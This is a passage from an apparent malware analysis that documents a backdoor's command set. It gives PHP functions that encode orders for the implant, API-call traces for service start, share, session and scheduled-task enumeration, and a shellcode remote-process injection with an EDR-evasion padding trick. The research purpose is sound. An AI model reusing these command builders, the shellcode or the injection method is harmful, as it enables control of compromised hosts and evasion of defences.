[INF] [ Thread is from a Worker Pool ]
[API] <LoadLibraryExA> in [KERNEL32.DLL] 
[PAR] LPCTSTR lpFileName : 0x0000001E6091EEC4 ("mscoree.dll")
[PAR] DWORD   dwFlags    : 0x0 (Same behavior as LoadLibrary)
[RET] 0x7fff820453c7

[CNT] [469]
[PTP] [0x478] [0x9a0] [c:\windows\system32\rundll32.exe]
[INF] [ Thread is from a Worker Pool ]
[API] <LoadLibraryExA> in [KERNEL32.DLL] 
[PAR] LPCTSTR lpFileName : 0x0000001E6091EEB3 ("mscoreei.dll")
[PAR] DWORD   dwFlags    : 0x0 (Same behavior as LoadLibrary)
[RET] 0x7fff820453c7

[CNT] [479]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <GetConsoleWindow> in [KERNEL32.DLL] 
[RET] [0x1e6030b0aa]

[CNT] [480]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <AllocConsole> in [KERNEL32.DLL] 
[RET] [0x1e602fa259]

[CNT] [504]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <GetConsoleWindow> in [KERNEL32.DLL] 
[RET] [0x1e602fa266]

[CNT] [505]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <ShowWindow> in [USER32.dll] 
[PAR] HWND hWnd     : 0x202b4
[PAR] int  nCmdShow : 0x0
[RET] [0x1e602fa26d]

[CNT] [506]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <CreatePipe> in [KERNEL32.DLL] 
[PAR] PHANDLE               hReadPipe        : 0x0000001E6091EF58
[PAR] PHANDLE               hWritePipe       : 0x0000001E6091EF60
[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x0000001E6091EE98
[PAR] DWORD                 nSize            : 0x0
[RET] [0x1e602fa2eb]

[ * ] [pid 0x478][tid 0x838] c:\windows\system32\rundll32.exe
[API] <CreatePipe>
[PAR] HANDLE  hReadPipe  : 0x324
[PAR] HANDLE  hWritePipe : 0x328
[RES] BOOL 0x1

[CNT] [662]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <SafeArrayCreate> in [OLEAUT32.dll] 
[PAR] VARTYPE         vt         : 0x11
[PAR] UINT            cDims      : 0x1
[PAR] SAFEARRAYBOUND  *rgsabound : 0x0000001E6091EE1C
[FLD]                 rgsabound[0]
[FLD]                 -> cElements = 0x1c00
[FLD]                 -> lLbound   = 0x0
[RET] [0x1e6030cebc]

[CNT] [663]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <SafeArrayLock> in [OLEAUT32.dll] 
[PAR] SAFEARRAY* psa : 0x0000001E5E499DE0
[RET] [0x1e6030cec8]

[CNT] [673]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <CLRCreateInstance> in [mscoree.dll] 
[PAR] REFCLSID  clsid       : 0x0000001E60327B60 ({9280188D-0E8E-4867-B30C-7FA83884E8DE})
[PAR] REFIID    riid         : 0x0000001E60327C40 (ICLRMetaHost)
[PAR] LPVOID    *ppInterface : 0x0000001E6091EDF0
[RET] [0x1e6030b46d]

[CNT] [674]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <ICLRMetaHost::GetRuntime> in [mscoreei.dll] 
[PAR] LPCWSTR pwzVersion : 0x0000001E5E4A0CB0 ("v4.0.30319")
[PAR] REFIID  riid       : 0x0000001E60327C50 (ICLRRuntimeInfo)
[PAR] LPVOID  *ppRuntime : 0x0000001E6091EDE8
[RET] [0x1e6030b489]

[CNT] [675]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <ICLRRuntimeInfo::IsLoadable> in [mscoreei.dll] 
[PAR] BOOL* pbLoadable : 0x0000001E6091ED04
[RET] [0x1e6030b49b]

[CNT] [676]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <ICLRRuntimeInfo::GetInterface> in [mscoreei.dll] 
[PAR] REFCLSID  clsid    : 0x0000001E60327B70 ({76833450-7FFF-0000-A075-8376FF7F0000})
[PAR] REFIID    riid     : 0x0000001E60327C60 (ICorRuntimeHost)
[PAR] LPVOID     *ppUnk  : 0x0000001E6091EDC0
[RET] [0x1e6030b4c0]

[CNT] [685]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <ICorRuntimeHost::Start> in [clr.dll] 
[RET] [0x1e6030d112]

[CNT] [687]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <ICorRuntimeHost::CreateDomain> in [clr.dll] 
[PAR] LPCWSTR    pwzFriendlyName : 0x0000001E6091EE32
[STR]            -> "f09er35s9u"
[PAR] IUnknown*  pIdentityArray  : 0x0
[PAR] IUnknown** pAppDomain      : 0x0000001E6091EDD0
[RET] [0x1e6030d182]
```

**III. Result**   

I unfortunatly always get an error 0x80070002 (file not found) when reaching the CreateDomain Call, not sure why :  

```html
[CNT] [735]
[PTP] [0x478] [0x838] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000001E5E5326F0
[STR]        -> "9999"
[STR]           "80070002"
[PAR] DWORD  cbBinary   : 0x1a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000001E5E4FAB30
[PAR] DWORD* pcchString : 0x0000001E6091EC5C
[RET] [0x1e6030e028]
```

<a id="StartService"></a>
# StartService  

```php
function StartService($MachineName, $ServiceName)
{
	$cmd_id = "\x56\x34 $MachineName $ServiceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000C96B1E3C60
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+QuHESPwfZxLiwC6kHD5hsnoJYG0KtuqZac7/JBB0"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000C96B1EED40
[PAR] DWORD   *pcbBinary : 0x000000C96D09EB0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xc96cffbea1]
```

**II. Execution**   

```html
[CNT] [337]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <OpenSCManagerA> in [ADVAPI32.dll] 
[PAR] LPCSTR  lpMachineName   : 0x0 (null)
[PAR] LPCSTR  lpDatabaseName  : 0x000000C96D0188F4
[STR]         -> "ServicesActive"
[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
[RET] [0xc96d00dcc5]

[CNT] [338]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <OpenServiceW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hSCManager      : 0x6b201bd0 
[PAR] LPCWSTR   lpServiceName   : 0x000000C96B1F02D0
[STR]           -> "evil"
[PAR] DWORD     dwDesiredAccess : 0xf01ff (SERVICE_ALL_ACCESS)
[RET] [0xc96d00dcf3]

[CNT] [339]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <StartServiceA> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hService            : 0x000000C96B202140
[PAR] DWORD     dwNumServiceArgs    : 0x0
[PAR] LPCTSTR*  lpServiceArgVectors : 0x0
[RET] [0xc96d00dd09]
```

**III. Result**   

```html
[CNT] [349]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000C96B1EFE10
[STR]        -> "9999"
[STR]           "2"
[PAR] DWORD  cbBinary   : 0xc
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000C96B201A50
[PAR] DWORD* pcchString : 0x000000C96D09E8DC
[RET] [0xc96cffe028]
```

<a id="NetSessionEnum"></a>
# NetSessionEnum  

```php
function NetSessionEnum($ServerName)
{
	$cmd_id = "\x8E\xB9 $ServerName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0x7d0] [0xb30] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000227DD51170
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+fvn+SPwfZxLiwC6kHD5hsh9udygI3A=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000227DD5B230
[PAR] DWORD   *pcbBinary : 0x000000227FC7E9AC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x227fbdbea1]
```

**II. Execution**   

```html
[CNT] [405]
[PTP] [0x7d0] [0xb30] [c:\windows\system32\rundll32.exe]
[API] <NetSessionEnum> in [srvcli.dll] 
[PAR] LMSTR   servername    : 0x000000227DD600A0
[STR]         -> "localhost"
[PAR] LMSTR   UncClientName : 0x0 (null)
[PAR] LMSTR   username      : 0x0 (null)
[PAR] DWORD   level         : 10
[PAR] LPBYTE  *bufptr       : 0x000000227FC7E8B8
[PAR] DWORD   prefmaxlen    : 0xffffffff
[PAR] LPDWORD entriesread   : 0x000000227FC7E89C
[PAR] LPDWORD totalentries  : 0x000000227FC7E8A0
[PAR] LPDWORD resume_handle : 0x000000227FC7E8A4
[RET] [0x227fbe9826]
```

**III. Result**   

```html
[CNT] [416]
[PTP] [0x7d0] [0xb30] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000227DD7E060
[STR]        -> "8EB9"
[STR]           "localhost"
[STR]           "\\[::1] user 0 0"
[PAR] DWORD  cbBinary   : 0x40
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000227DD68120
[PAR] DWORD* pcchString : 0x000000227FC7E7BC
[RET] [0x227fbde028]
```

<a id="AD_Object_unknown"></a>
# AD_Object_unknown  

TODO, no domain controler for dynamic suepervision

```php
function AD_Object_todo($p1, $p2, $p3)
{
	$cmd_id = "\x79\x75 $p1 $p2 $p3";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

<a id="NetUserModalsGet"></a>
# NetUserModalsGet  

```php
// ex: NetUserModalsGet("localhost");
function NetUserModalsGet($ServerName)
{
	$cmd_id = "\x9a\xb9 $ServerName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xb2c] [0xb70] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000002599684690
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+efn+SPwfZxLiwC6kHD5hsh9udygI3A=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000002599689DD0
[PAR] DWORD   *pcbBinary : 0x000000259B56ECDC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x259b4cbea1]
```

**II. Execution**   

```html
[CNT] [366]
[PTP] [0xb2c] [0xb70] [c:\windows\system32\rundll32.exe]
[API] <NetUserModalsGet> in [SAMCLI.DLL] 
[PAR] LMSTR   servername    : 0x0000002599690150
[STR]         -> "localhost"
[PAR] DWORD   level         : 0
[PAR] LPBYTE* bufptr        : 0x000000259B56EBF8
[RET] [0x259b4d56a8]
```

**III. Result**   

```html
[CNT] [450]
[PTP] [0xb2c] [0xb70] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000259968AD00
[STR]        -> "9AB9"
[STR]           "localhost"
[STR]           "AA 0"
[STR]           "AB 42"
[STR]           "AC 0"
[STR]           "AD 4294967295"
[STR]           "AE 0"
[STR]           "BA 30"
[STR]           "BB 30"
[STR]           "BC 0"
[PAR] DWORD  cbBinary   : 0x86
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000025996A3B30
[PAR] DWORD* pcchString : 0x000000259B56EB1C
[RET] [0x259b4ce028]
```

<a id="GetScheduledTask"></a>
# GetScheduledTask  

```php
/*
	$p1 : servername
	$p2 = 'full' (optional)
	$p3 = unknown (optional)
*/

// ex:  GetScheduledTask("localhost");
function GetScheduledTask($serverName)
{
	$cmd_id = "\x9a\xb6 $serverName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [429]
[PTP] [0x830] [0x9f4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000047E83C94D0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+efnMSPwfZxLiwC6kHD5hsg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000047E83DADB0
[PAR] DWORD   *pcbBinary : 0x00000047EA3DE65C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x47ea33bea1]
```

**II. Execution**   

```html
[CNT] [459]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <CoInitializeEx> in [combase.dll] 
[RET] [0x47ea34c890]

[CNT] [462]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <CoCreateInstance> in [combase.dll] 
[PAR] REFCLSID  *clsid       : 0x00000047EA357BA0 ({0F87369F-A4E5-4CFC-BD3E-73E6154572DD})
[PAR] LPUNKNOWN pUnkOuter    : 0x0
[PAR] DWORD     dwClsContext : 0x1
[PAR] REFIID    riid         : 0x00000047EA357BF0 (ITaskService)
[PAR] LPVOID    *ppv         : 0x00000047EA95F0C0
[RET] [0x47ea34c8b9]

[CNT] [480]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <ITaskService::Connect> in [taskschd.dll] 
[PAR] VARIANT serverName : 0x00000047EA95F0A0
[FLD]         -> serverName = NULL
[PAR] VARIANT user       : 0x00000047EA95F080
[FLD]         -> user = NULL
[PAR] VARIANT domain     : 0x00000047EA95F060
[FLD]         -> domain = NULL
[PAR] VARIANT password   : 0x00000047EA95F040
[FLD]         -> password = NULL
[RET] [0x47ea34c973]

[CNT] [482]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <ITaskService::GetFolder> in [taskschd.dll] 
[PAR] BSTR        path       : 0x00000047E83CE188
[STR]             -> "\"
[PAR] ITaskFolder **ppFolder : 0x00000047EA95F0C8
[RET] [0x47ea34c9a0]

[CNT] [483]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <ITaskFolder::GetFolders> in [taskschd.dll] 
[PAR] LONG                    flags     : 0x0
[PAR] ITaskFolderCollection** ppFolders : 0x00000047EA95ED78
[RET] [0x47ea34c36a]

[CNT] [484]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <ITaskFolderCollection::Invoke> in [taskschd.dll] 
[PAR] DISPID dispIdMember : 0xea95ed6c
[PAR] REFIID riid         : 0x0 
[PAR] LCID   lcid         : 0x44c337e0
[PAR] WORD   wFlags       : 0x4
[RET] [0x47ea34c385]

[CNT] [485]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <ITaskFolderCollection::get_Count> in [taskschd.dll] 
[PAR] LONG *pCount : 0x00000047EA95ED40
[RET] [0x47ea34c3d7]

[...]

[CNT] [494]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <ITaskFolder::GetTasks> in [taskschd.dll] 
[PAR] LONG                        flags   : 0x1
[PAR] IRegisteredTaskCollection** ppTasks : 0x00000047EA95E440
[RET] [0x47ea34c417]

[CNT] [495]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTaskCollection::get_Count> in [taskschd.dll] 
[PAR] LONG *pCount : 0x00000047EA95E43C
[RET] [0x47ea34c43f]

[CNT] [496]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTaskCollection::get_Item> in [taskschd.dll] 
[PAR] VARIANT           index            : 0x00000047EA95E410
[FLD]                   -> vUlong = 0x1
[PAR] IRegisteredTask** ppRegisteredTask : 0x00000047EA95E460
[RET] [0x47ea34c4a2]

[CNT] [497]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTask::get_Name> in [taskschd.dll] 
[PAR] BSTR* pName 0x00000047EA95E468
[RET] [0x47ea34c4d4]

[CNT] [514]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTask::get_Path> in [taskschd.dll] 
[PAR] BSTR *pPath : 0x00000047EA95E380
[RET] [0x47ea3499ff]

[CNT] [520]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTask::get_Enabled> in [taskschd.dll] 
[PAR] VARIANT_BOOL *pEnabled : 0x00000047EA95E37A
[RET] [0x47ea349a62]

[CNT] [527]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTask::get_LastRunTime> in [taskschd.dll] 
[PAR] DATE* pLastRunTime 0x00000047EA95E390
[RET] [0x47ea349ac8]

[CNT] [534]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTask::GetSecurityDescriptor> in [taskschd.dll] 
[RET] [0x47ea349b42]

[CNT] [541]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTask::get_State> in [taskschd.dll] 
[PAR] TASK_STATE* pState : 0x00000047EA95E37C
[RET] [0x47ea349bb6]

[CNT] [550]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <IRegisteredTask::Release> in [taskschd.dll] 
[RET] [0x47ea34c621]

[...]
```

**III. Result**   

```html
[CNT] [552]
[PTP] [0x830] [0xa9c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000047E83F6E70
[STR]        -> "9AB6"
[STR]           "AB 1|AA .NET Framework NGEN v4.0.30319|AC \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319|AD -1|AE 24/0"
[STR]           "3/2025 02:46:56|AF 00:00:00|BA 3|"
[PAR] DWORD  cbBinary   : 0x13c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000047E83F6FC0
[PAR] DWORD* pcchString : 0x00000047EA95E34C
[RET] [0x47ea33e028]
```

<a id="netshareenumlist"></a>
# netshareenumlist   

So, this function is basically the same as "netshareenum" except it expects as a parameter a list of server names separated by a '\n' instead of a single server name  

```php
// ex : netshareenumlist("home\nlocalhost", 1);
function netshareenum2($servernames)
{
	$servernames_b64 = base64_encode($servernames);
	$cmd_id = "\xb3\x29 $servernames_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [429]
[PTP] [0x9c0] [0x5bc] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000001892FEBB40
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Z/L+SMcNPU3f0SaZHUVh634lAzAyivnLIYPzKSYdUc70BSnSjvw="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000001892FD27A0
[PAR] DWORD   *pcbBinary : 0x0000001894EBE95C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x1894e1bea1]
```

**II. Execution**   

```html
[CNT] [500]
[PTP] [0x9c0] [0x958] [c:\windows\system32\rundll32.exe]
[API] <NetShareEnum> in [srvcli.dll] 
[PAR] LMSTR   servername    : 0x000000189542F0E8
[STR]         -> "home"
[PAR] DWORD   level         : 501
[PAR] LPBYTE* bufptr        : 0x000000189542EF48
[PAR] DWORD   prefmaxlen    : 0xffffffff
[PAR] LPDWORD entriesread   : 0x000000189542EF2C
[PAR] LPDWORD totalentries  : 0x000000189542EF30
[PAR] LPDWORD resume_handle : 0x000000189542EF34
[RET] [0x1894e1f028]

[...]

[CNT] [521]
[PTP] [0x9c0] [0x958] [c:\windows\system32\rundll32.exe]
[API] <NetShareEnum> in [srvcli.dll] 
[PAR] LMSTR   servername    : 0x000000189542F0E8
[STR]         -> "localhost"
[PAR] DWORD   level         : 501
[PAR] LPBYTE* bufptr        : 0x000000189542EF48
[PAR] DWORD   prefmaxlen    : 0xffffffff
[PAR] LPDWORD entriesread   : 0x000000189542EF2C
[PAR] LPDWORD totalentries  : 0x000000189542EF30
[PAR] LPDWORD resume_handle : 0x000000189542EF34
[RET] [0x1894e1f028]
```

**III. Result**   

```html
[CNT] [525]
[PTP] [0x9c0] [0x958] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000001892FB6720
[STR]        -> "5349"
[STR]           "localhost"
[STR]           "AB"
[STR]           "ADMIN$|Administration à distance"
[STR]           "C$|Partage par défaut"
[STR]           "IPC$|IPC distant"
[PAR] DWORD  cbBinary   : 0xb4
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000001892FCF3C0
[PAR] DWORD* pcchString : 0x000000189542EE2C
[RET] [0x1894e1e028]
```

<a id="InjectProcessShellcode"></a>
# InjectProcessShellcode  

This command trigger a shellcode injection in a remote process, in the example below I used a simple x64 calc.exe shellcode, credit to : [senzee1984](https://github.com/senzee1984/Windows_x64_Calc_Shellcode/blob/main/calc.py)   
I targeted an already running calc.exe process to make it spawn, through the shellcode injection, another calc.exe  

Another detail maybe worth mentioning :  

In this example, the memory allocated in the remote process starts @ 0x000000BCF7320000, the shellcode @ 0x000000BCF7320014.  
The reason for this 0x14 byte shift is that the first 0x14 bytes are randomly generated characters.  
This is very likely to defeat some specific EDR that would try to detect or emulate valid assembly instructions on memory allocated with PAGE_EXECUTE rights.  

```php
function InjectProcessShellcode($pid)
{
	
	$buf =  "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d";
	$buf =  $buf . "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01";
	$buf =  $buf . "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01";
	$buf =  $buf . "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31";
	$buf =  $buf . "\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45";
	$buf =  $buf . "\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b";
	$buf =  $buf . "\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31";
	$buf =  $buf . "\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2";
	$buf =  $buf . "\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
	
	$payload_b64 = base64_encode($buf);
	$cmd_id = "\xa9\xe4 $pid $payload_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [359]
[PTP] [0x5e4] [0x218] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004176008250
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Ze7ESNMiH0n1/hSfLEhH1mQiYC8/p9vQFIXSIz55J6mNFQSVoKpuXbOjYvCqMb39JNQf8LOtfPEHYMuDOZvHQbdcCeYKbVqZ"
[STR]            "wVx/6UtpqX+JWH9QKkhY3VEMOYjb6cBwku9dnVOK+jjPh8GWRSUdl99RmhEHmWPIAEhSzIojQchP710Xrc9Np7x6mGLrz2E+F8WruhvPwmHYr37CxKihK7IE"
[STR]            "byeHDt+pkqljLukryQomrJ/dj+8cBnmAIEZyyLyCpa+sJK0pBm/LC8uU8M4QdIDOIfrtgcHS8lf70K3MJR016JdYm4JmxbOE1acz8oJ3XW8WHF+A7uF66O6G"
[STR]            "p5QzYSarXu84eeo487K7f2hG/fgGnsrApnraUPyzhEEfXHQ+vut9eqVNcL3KbgT6odBXi9sa9uXuVw6684sSXJBjVwdYiA=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004175FFFE70
[PAR] DWORD   *pcbBinary : 0x0000004177E8EB9C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4177debea1]
```

**II. Execution**   

```html
[CNT] [387]
[PTP] [0x5e4] [0x9c8] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x00000041783FF0C0
[PAR] ACCESS_MASK         DesiredAccess    : 0x2a (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x00000041783FF120
[PAR] PCLIENT_ID          ClientId         : 0x00000041783FF0C8
[FLD]                    -> UniqueProcess = 0xbf0
[FLD]                    -> UniqueThread  = 0x0
[RET] [0x4177e04aab]

[CNT] [388]
[PTP] [0x5e4] [0x9c8] [c:\windows\system32\rundll32.exe]
[API] <VirtualAllocEx> in [KERNEL32.DLL] 
[PAR] HANDLE hProcess     : 0x2c8
[PAR] LPVOID lpAddress    : 0x0
[PAR] SIZE_T dwSize       : 0xbe
[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
[RET] [0x4177dd6395]

[CNT] [389]
[PTP] [0x5e4] [0x9c8] [c:\windows\system32\rundll32.exe]
[API] <WriteProcessMemory> in [KERNEL32.DLL] 
[PAR] HANDLE  hProcess      : 0x2c8
[PAR] LPVOID  lpBaseAddress : 0x000000BCF7320000
[PAR] LPCVOID lpBuffer      : 0x0000004175FFDDD0
[PAR] SIZE_T  nSize         : 0xbd
[RET] [0x4177dd63bd]

[CNT] [390]
[PTP] [0x5e4] [0x9c8] [c:\windows\system32\rundll32.exe]
[API] <VirtualProtectEx> in [KERNEL32.DLL] 
[PAR] HANDLE hProcess     : 0x2c8
[PAR] LPVOID lpAddress    : 0x000000BCF7320000
[PAR] SIZE_T dwSize       : 0xbe
[PAR] DWORD  flNewProtect : 0x20 (PAGE_EXECUTE_READ)
[RET] [0x4177dd63e4]

[CNT] [411]
[PTP] [0x5e4] [0x9c8] [c:\windows\system32\rundll32.exe]
[API] <CreateRemoteThread> in [KERNEL32.DLL] 
[PAR] HANDLE                 hProcess           : 0x2c8
[PAR] LPSECURITY_ATTRIBUTES  lpThreadAttributes : 0x0
[PAR] SIZE_T                 dwStackSize        : 0x100000
[PAR] LPTHREAD_START_ROUTINE lpStartAddress     : 0x000000BCF7320014
[PAR] LPVOID                 lpParameter        : 0x0
[PAR] DWORD                  dwCreationFlags    : 0x0
[PAR] LPDWORD                lpThreadId         : 0x00000041783FE994
[RET] [0x4177dd5e93]
```

**III. Result**   

```html
[CNT] [420]
[PTP] [0xbf0] [0x858] [c:\windows\system32\calc.exe]
[API] <WinExec> in [KERNEL32.DLL] 
[PAR] LPCSTR lpCmdLine : 0x000000BCF742F778
[STR]        -> "calc.exe"
[RET] [0xbcf73200bd]
```

<a id="WtsEnumProcessA"></a>
# WtsEnumProcessA  

```php
// ex: WtsEnumProcessA("localhost");
function WtsEnumProcessA($RDServerName)
{
	$cmd_id = "\xf3\xd8 $RDServerName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
